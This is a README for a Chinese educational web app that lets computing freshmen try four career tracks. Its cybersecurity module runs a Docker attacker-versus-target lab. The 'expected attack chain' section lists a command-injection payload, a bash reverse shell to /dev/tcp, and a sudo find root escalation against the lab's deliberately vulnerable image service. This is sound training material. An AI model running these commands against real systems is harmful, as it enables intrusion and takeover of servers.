# 代码岔路口 · Code Crossroads

让计算机新生通过四个浏览器内的短关卡，亲手试一遍软件工程、网络安全、人工智能和嵌入式，最终得到方向画像与职业建议。

当前阶段已经完成：

- 登录页与演示登录状态
- 登录后的方向选择主页
- 四个方向的统一数据配置
- **网络安全模块：Operation LUMEN（攻击者终端 + 靶机 + root 接管）**
- 软件 / AI / 嵌入式方向的通用工作台占位路由

## 启动

```bash
pnpm install
pnpm dev
```

打开终端中显示的地址，默认是 `http://localhost:5173`。

演示账号：`admin`，密码：`passwd`。

## 网络安全模块：Operation LUMEN

真实执行链路：**浏览器 xterm → Fastify WebSocket → Docker attacker 容器 / target 容器**。
Docker 不可用时会明确报错，不会静默降级。

### 本地运行

1. 启动 Docker Desktop（确保 daemon 运行中）。
2. 构建两个镜像：

```bash
pnpm docker:build
```

3. 启动后端执行引擎：

```bash
pnpm dev:server
```

4. 另开终端启动前端：

```bash
pnpm dev
```

5. 登录后进入「网络安全」，按任务简报攻击靶机。

### 预期攻击链

```text
nmap -sT -sV <target>
  → curl http://<target>:8000/ 与 /robots.txt
  → curl "http://<target>:8080/api/convert?file=test.png;id;"
  → 监听器 nc -lvnp 4444
  → file=x;bash -i >& /dev/tcp/<你的IP>/4444 0>&1;
  → sudo -l
  → sudo find . -exec /bin/sh -p \; -quit
  → id
  → 看到 uid=0(root)，自动触发「你已控制该服务器」
```

靶机服务在 `8000`（公开站）和 `8080`（内部图片处理 API）；两个容器在每场会话独立的 Docker 内部网络中，使用静态 IP 通信，不暴露宿主机端口。

最终反馈不是提交 flag，而是检测到 root shell 中的 `uid=0(root)` 后，直接判定你已经控制该服务器。`user.txt` / `root.txt` 仍作为可选彩蛋保留，但不会出现在主流程里。

## 构建检查

```bash
pnpm lint
pnpm build
pnpm typecheck:server
```

## 目录结构

```text
src/
├── app/
│   └── App.tsx                 # 应用入口、路由与登录状态切换
├── components/
│   ├── BrandMark.tsx           # 品牌标识
│   └── TrackCard.tsx           # 方向卡片
├── data/
│   └── tracks.ts               # 四个方向的统一配置
├── features/
│   ├── auth/
│   │   └── authStore.ts        # 当前演示登录状态
│   └── security/
│       ├── api.ts              # 安全模块 REST / WebSocket 封装
│       └── TerminalPane.tsx    # xterm 终端面板
├── pages/
│   ├── LoginPage.tsx           # 登录页
│   ├── HomePage.tsx            # 方向选择主页
│   ├── SecurityWorkbenchPage.tsx # 网络安全工作台
│   └── TrackPlaceholderPage.tsx# 其余方向占位页
├── styles/
│   └── app.css                 # 应用级样式与动效
├── index.css                   # Tailwind 与全局基础样式
└── main.tsx                    # React 挂载入口
```

后端与靶机：

```text
server/
├── routes/security.ts          # 安全房间 HTTP / WebSocket 路由
├── security/
│   ├── room.ts                 # 双容器编排、Flag、进度
│   └── hints.ts                # 渐进式提示
└── docker/manager.ts           # 镜像 / 容器生命周期与限额

docker/
├── attacker.Dockerfile         # nmap / curl / nc / python
├── target.Dockerfile           # 带漏洞的 PixelForge 图片服务
├── target/app.py               # 靶机 Web 服务
└── build.sh                    # 构建 attacker + target 镜像
```
